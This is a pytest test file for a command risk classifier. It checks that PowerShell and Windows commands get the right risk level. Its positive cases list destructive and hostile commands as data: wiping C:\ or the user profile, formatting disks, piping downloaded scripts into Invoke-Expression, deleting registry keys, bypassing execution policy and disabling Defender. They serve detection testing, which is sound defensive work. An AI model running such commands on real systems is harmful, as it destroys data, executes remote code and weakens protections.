"""Règles de risque PowerShell / Windows : au moins un cas positif et un négatif par règle."""

import pytest

from src.core.risk import HIGH, LOW, MEDIUM, assess

POSITIVE = [
    ("ps-remove-root", r"Remove-Item -Recurse -Force C:\ ", HIGH),
    ("ps-remove-root", r"rm -r -fo $env:USERPROFILE", HIGH),
    ("ps-remove-root", r"del /s /q C:\*", HIGH),
    ("ps-remove-root", r"ri -Rec ~", HIGH),
    ("ps-format-disk", "Format-Volume -DriveLetter D -FileSystem NTFS", HIGH),
    ("ps-format-disk", "Clear-Disk -Number 1 -RemoveData", HIGH),
    ("ps-download-exec", "iwr https://example.com/x.ps1 | iex", HIGH),
    ("ps-download-exec", "irm https://get.example.com | Invoke-Expression", HIGH),
    ("ps-download-exec", 'iex (New-Object Net.WebClient).DownloadString("https://x")', HIGH),
    ("ps-registry-delete", r"reg delete HKCU\Software\Demo /f", HIGH),
    ("ps-registry-delete", r"Remove-Item -Path HKLM:\SOFTWARE\Demo", HIGH),
    ("ps-execution-policy", "Set-ExecutionPolicy Unrestricted", HIGH),
    ("ps-execution-policy", "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process", HIGH),
    ("ps-disable-defender", "Set-MpPreference -DisableRealtimeMonitoring $true", HIGH),
    ("ps-remove-recursive", r"Remove-Item -Recurse .\build", MEDIUM),
    ("ps-remove-recursive", "rd /s /q node_modules", MEDIUM),
    ("ps-kill-force", "Stop-Process -Name node -Force", MEDIUM),
    ("ps-kill-force", "taskkill /F /IM node.exe", MEDIUM),
    ("ps-power", "Restart-Computer", MEDIUM),
    ("ps-power", "shutdown /s /t 0", MEDIUM),
    ("ps-run-as-admin", "Start-Process pwsh -Verb RunAs", MEDIUM),
    ("ps-invoke-expression", "Invoke-Expression $cmd", MEDIUM),
    ("ps-overwrite", "Set-Content config.json '{}'", MEDIUM),
    ("ps-overwrite", "Get-Date | Out-File log.txt", MEDIUM),
]

NEGATIVE = [
    "Remove-Item foo.txt",
    r"Remove-Item -Recurse .\build",  # récursif mais pas une racine : pas de ps-remove-root
    "Get-ChildItem -Recurse -Filter *.log",
    "Get-Volume",
    "iwr https://example.com/file.zip -OutFile file.zip",
    r"reg query HKCU\Software\Demo",
    "Set-ExecutionPolicy -Scope CurrentUser RemoteSigned",
    "Get-MpPreference",
    "Get-Process node",
    "Start-Process notepad",
    "Add-Content log.txt done",
    "Get-Date | Out-File -Append log.txt",
    "git push origin main",
    "npm install -D vite",
]


@pytest.mark.parametrize("rule_id,command,level", POSITIVE)
def test_powershell_rule_matches(rule_id, command, level):
    a = assess(command)
    assert rule_id in [h[0] for h in a.hits], (command, a.hits)
    assert a.level >= level


@pytest.mark.parametrize("command", NEGATIVE)
def test_powershell_rules_stay_quiet(command):
    a = assess(command)
    ps_hits = [h[0] for h in a.hits if h[0].startswith("ps-")]
    if command.startswith("Remove-Item -Recurse"):
        assert "ps-remove-root" not in ps_hits
    else:
        assert ps_hits == [], (command, a.hits)


def test_case_insensitive_like_powershell():
    assert assess(r"REMOVE-ITEM -RECURSE -FORCE C:\ ").level == HIGH
    assert assess("IWR https://x | IEX").level == HIGH


def test_safe_powershell_commands_are_low():
    for c in ("Get-ChildItem", "Set-Location ..", "Write-Output hello", "Test-Path .\\x"):
        assert assess(c).level == LOW, c
